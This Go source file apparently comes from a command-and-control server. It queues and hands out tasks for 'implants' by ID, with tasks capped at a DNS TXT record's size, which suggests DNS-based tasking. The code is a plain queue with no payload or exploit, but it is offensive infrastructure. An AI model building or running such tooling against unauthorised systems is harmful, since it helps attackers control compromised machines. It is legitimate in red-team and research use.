package main

/*
 * tasking.go
 * Get and set tasking for implants
 * By J. Stuart McMurray
 * Created 20180210
 * Last Modified 20180210
 */

import (
	"errors"
	"fmt"
	"log"
)

const (
	// MAXTASKLEN is the maximum size of a single task.  This should be the
	// maximum size of a TXT record
	MAXTASKLEN = 255
)

// SetTasking tries to queue up the task for the implant with the given ID.  It
// returns an error if the tasking is too long.
func SetTasking(id string, task []byte) error {
	/* Make sure the tasking isn't too long */
	if MAXTASKLEN < len(task) {
		return fmt.Errorf(
			"task too large, must be <=%v bytes",
			MAXTASKLEN,
		)
	}

	/* Make sure we have a Implant for this ID */
	IMPLANTS.ContainsOrAdd(id, NewImplant(id))

	/* Get the Implant to task */
	v, ok := IMPLANTS.Get(id)
	if !ok {
		log.Printf("[ID-%v] Forgotten too fast", id)
		return errors.New("implant forgotten too fast")
	}
	i, ok := v.(*Implant)
	if !ok {
		log.Panicf("wrong type of implant: %T", v)
	}

	/* Lock it, add a task */
	i.l.Lock()
	defer i.l.Unlock()
	i.q.PushBack(string(task))

	return nil
}

// GetTasking tries to get tasking for the implant with the given ID.  It
// returns the empty string if there is none.
func GetTasking(id string) string {
	/* Get the relevant Queue */
	v, ok := IMPLANTS.Get(id)
	if !ok {
		return ""
	}

	i, ok := v.(*Implant)
	if !ok {
		log.Panicf("Bad implant type %T", v)
	}

	/* Pop a task from the front */
	i.l.Lock()
	defer i.l.Unlock()
	if 0 == i.q.Len() {
		return ""
	}
	e := i.q.Front()
	i.q.Remove(e)
	t, ok := e.Value.(string)
	if !ok {
		log.Panicf("Bad queued task type %T", e.Value)
	}
	return t
}
